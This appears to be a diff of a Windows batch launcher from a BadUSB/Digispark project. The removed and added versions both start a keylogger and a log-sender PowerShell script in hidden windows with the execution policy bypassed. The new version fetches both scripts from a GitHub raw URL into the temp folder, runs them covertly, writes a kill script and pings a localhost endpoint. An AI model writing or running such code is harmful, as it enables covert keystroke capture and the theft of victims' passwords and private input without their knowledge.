@@ -1,38 +1,57 @@
 @echo off
-:: UltimateStealthRunner.bat - Completely hidden launcher (non-self-deleting version)
-if "%1" == "hidden" goto :main
+:: StealthManager.bat - Visible Main with Hidden Child Processes
+:: Description: Main script runs visibly but launches keylogger and sender completely hidden
 
-:: First self-launch in hidden mode
-powershell -window hidden -command "Start-Process cmd.exe -ArgumentList '/c','%~f0','hidden' -WindowStyle Hidden"
-exit
+:: Phase 1: Set file paths
+set "kl_path=%temp%\kl.ps1"
+set "sn_path=%temp%\sn.ps1"
+set "killer_path=%temp%\killer.bat"
 
-:main
-:: Create window hiding PowerShell code
-echo [DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state); > "%temp%\hide.ps1"
-echo add-type -name win -memberDefinition $t -namespace native >> "%temp%\hide.ps1"
-echo [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() ^| Get-Process).MainWindowHandle, 0) >> "%temp%\hide.ps1"
+echo [INFO] Checking for required files...
+echo [DEBUG] KL Path: %kl_path%
+echo [DEBUG] SN Path: %sn_path%
 
-:: Launch keylogger (completely hidden)
-powershell -executionpolicy bypass -windowstyle hidden -command "& {. '%temp%\hide.ps1'; Start-Process powershell.exe -ArgumentList '-nologo','-windowstyle','hidden','-executionpolicy','bypass','-file','%~dp0KeyLogger.ps1' -WindowStyle Hidden}"
+:: Phase 2: Download files if missing (with error handling)
+if not exist "%kl_path%" (
+    echo [INFO] Downloading KeyLogger.ps1...
+    powershell -command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/abolfazlrashidian/BadUSB/refs/heads/master/Digispark/KeyLogger/KeyLogger.ps1' -OutFile '%kl_path%' -ErrorAction Stop } catch { exit 1 }"
+    if errorlevel 1 (
+        echo [ERROR] Failed to download KeyLogger.ps1
+        pause
+        exit /b 1
+    )
+)
 
-:: Wait 2 seconds
-powershell -command "Start-Sleep -Seconds 2"
+if not exist "%sn_path%" (
+    echo [INFO] Downloading Sender.ps1...
+    powershell -command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/abolfazlrashidian/BadUSB/refs/heads/master/Digispark/KeyLogger/Sender.ps1' -OutFile '%sn_path%' -ErrorAction Stop } catch { exit 1 }"
+    if errorlevel 1 (
+        echo [ERROR] Failed to download Sender.ps1
+        pause
+        exit /b 1
+    )
+)
 
-:: Launch log sender (completely hidden)
-powershell -executionpolicy bypass -windowstyle hidden -command "& {. '%temp%\hide.ps1'; Start-Process powershell.exe -ArgumentList '-nologo','-windowstyle','hidden','-executionpolicy','bypass','-file','%~dp0Sender.ps1' -WindowStyle Hidden}"
+:: Phase 3: Execute both scripts COMPLETELY HIDDEN
+echo [INFO] Launching KeyLogger (hidden)...
+powershell -command "Start-Process powershell.exe -ArgumentList '-NoLogo','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','%kl_path%' -WindowStyle Hidden -ErrorAction Stop"
 
-:: Create kill script (hidden version)
-echo @echo off > "%temp%\kill_hidden.bat"
-echo taskkill /f /im powershell.exe /t >> "%temp%\kill_hidden.bat"
-echo taskkill /f /im cmd.exe /t >> "%temp%\kill_hidden.bat"
-echo del "%temp%\hide.ps1" >> "%temp%\kill_hidden.bat"
-echo start /b "" cmd /c del "%%~f0" ^& exit >> "%temp%\kill_hidden.bat"
+echo [INFO] Launching Sender (hidden)...
+powershell -command "Start-Process powershell.exe -ArgumentList '-NoLogo','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','%sn_path%' -WindowStyle Hidden -ErrorAction Stop"
 
-:: Create visible kill script (optional)
-echo @echo off > "kill_visible.bat"
-echo echo Terminating all hidden processes... >> "kill_visible.bat"
-echo call "%temp%\kill_hidden.bat" >> "kill_visible.bat"
-echo echo All components terminated. >> "kill_visible.bat"
-echo pause >> "kill_visible.bat"
+:: Phase 4: Create killer script
+echo [INFO] Creating killer.bat...
+(
+    echo @echo off
+    echo taskkill /f /im powershell.exe /fi "COMMANDLINE eq -file %kl_path%" 2^>nul
+    echo taskkill /f /im powershell.exe /fi "COMMANDLINE eq -file %sn_path%" 2^>nul
+    echo echo [INFO] Background processes terminated
+    echo pause
+) > "%killer_path%"
 
-exit
+:: Phase 5: Send success notification
+echo [INFO] Sending success notification...
+powershell -command "try { Invoke-WebRequest -Uri 'http://localhost:5000/receive_text?text=Files+executed+successfully' -Method Get -ErrorAction SilentlyContinue } catch {}"
+
+echo [INFO] All operations completed successfully
+pause
